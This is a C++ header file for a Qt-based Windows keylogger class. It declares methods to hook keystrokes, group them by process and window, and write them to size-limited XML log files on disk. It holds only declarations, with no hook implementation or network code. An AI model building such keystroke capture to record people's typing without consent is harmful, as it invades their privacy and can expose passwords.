#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <QObject>
#include <QDebug>
#include <QList>
#include <QTimer>
#include <QCoreApplication>
#include <QFileInfo>
#include <QFile>
#include <QtXml>
#include <QMap>
#include <QTextStream>
#include "windows.h"
#include "win32keyhook.h"
#include "logprocess.h"
#include "logevent.h"
#include "windowsinfo.h"

/**
 * @brief The KeyLogger class handles the log files
 */
class KeyLogger : public QObject
{
    Q_OBJECT
public:
    explicit KeyLogger(QObject *parent = 0);

    ~KeyLogger();

    /**
     * @brief The key log for the process
     */
    QMap<int,LogProcess*> processes;

    /**
     * @brief Start listening to key strokes
     */
    void start();

    /**
     * @brief Stop listening to keystrokes
     */
    void stop();

    /**
     * @brief Set the max size
     * @param size
     */
    void setMax(qint64 size);

    /**
     * @brief Set the default log path
     * @param path
     */
    void setPath(QString path);

signals:


public slots:

    /**
     * @brief Called when a key is pressed
     * @param event
     */
    void keyPress(LogEvent* event);

    /**
     * @brief Writes the logs to the disk
     */
    void writeLogs();

private:

    /**
     * @brief The handle of the last window
     */
    int m_lastHandle;

    /**
     * @brief The timer for disk writes
     */
    QTimer m_timer;

    /**
     * @brief The path to write logs to
     */
    QString m_path;

    /**
     * @brief The name of the last log file
     */
    QString m_file;

    /**
     * @brief The log file size limit
     */
    qint64 m_limit;

    /**
     * @brief Handle an error
     * @param error
     */
    void handleError(QString error);

    /**
     * @brief Returns the name of the log to write to
     * @return
     */
    QString getLogName();

    /**
     * @brief Update the process node within an element
     * @param process
     * @param root
     * @param processList
     * @param document
     * @return
     */
    bool updateProcessNode(LogProcess *process, QDomElement &root, QDomNodeList &processList, QDomDocument &document);

    /**
     * @brief Add the process node to an element
     * @param process
     * @param root
     * @param document
     */
    void addProcessNode(LogProcess* process, QDomElement &root,QDomDocument &document);

    /**
     * @brief Add the events to a process node
     * @param process
     * @param root
     * @param document
     */
    void addProcessEvents(LogProcess* process, QDomElement &root, QDomDocument &document);

};

#endif // KEYLOGGER_H
